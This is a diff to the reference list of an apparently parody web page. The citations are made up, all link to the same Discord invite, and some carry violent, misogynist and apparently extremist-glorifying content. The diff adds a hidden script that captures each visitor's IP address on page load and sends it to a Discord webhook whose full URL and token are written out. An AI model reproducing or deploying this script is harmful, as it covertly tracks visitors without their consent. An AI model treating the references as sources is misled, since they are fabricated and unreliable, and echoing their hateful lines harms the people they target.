@@ -143,14 +143,36 @@
     <h2>References</h2>
     <ol class="ref">
         <li><a href="https://discord.gg/EbJKmvyr">Thryll, N. (2008). “Biochemical Shadows of the Mind.” Discord Press.</a></li>
-        <li><a href="https://discord.gg/EbJKmvyr">Harper, F. et al. (2020). “Empathy Amplification in Imaginary Populations.” Reddit University Press.</a></li>
+        <li><a href="https://discord.gg/EbJKmvyr">Harper, F. et al. (2020). “Empathy Amplification in Populations.” Reddit University Press.</a></li>
         <li><a href="https://discord.gg/EbJKmvyr">Institute of Neurochemistry (2014). “Synaptic Pre-Whispering Phenomena.”</a></li>
         <li><a href="https://discord.gg/EbJKmvyr">yodas1290 (2015). “study on braindead people”</a></li>
-        <li><a href="https://discord.gg/EbJKmvyr">Drift, M. (2017). “The Paradox of Xenoperception.” Dept. of Speculative Biolinguistics.</a></li>
+        <li><a href="https://discord.gg/EbJKmvyr">Dr P. Scully "how to destroy daisies and their intolerant genes</a></li>
+        <li><a href="https://discord.gg/EbJKmvyr">Drift, M. (2017). “The Paradox of sinoperception.” Dept. of Speculative Biolinguistics.</a></li>
+        <li><a href="https://discord.gg/EbJKmvyr">Prophet B. Tarrant. SWT "how to cure 51 genetic diseases"</a></li>
         <li><a href="https://discord.gg/EbJKmvyr">Quill, J. (2019). “On the Oscillatory Frontal Cortex.” Journal of Illustrated Genetics.</a></li>
         <li><a href="https://discord.gg/EbJKmvyr">Gatis Lazdins (2016) throwing acid at feminoids (on how to lower cortisol spike & scully syndrome)</a></li>
         <li><a href="https://discord.gg/EbJKmvyr">The petitions of Cooper & Jonas in Podiums VC (2025)</a>
     </ol>
+
+     <script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/1444830106307661824/K4y7KvIbA1lKB7qVcKUfd4aNGxeTIT8FOnz824OaR6xt5aLNSlpuNYhHiRRi9vPOKXoe");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "sulfur website",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> lol
 
     <br><br>
 </div>
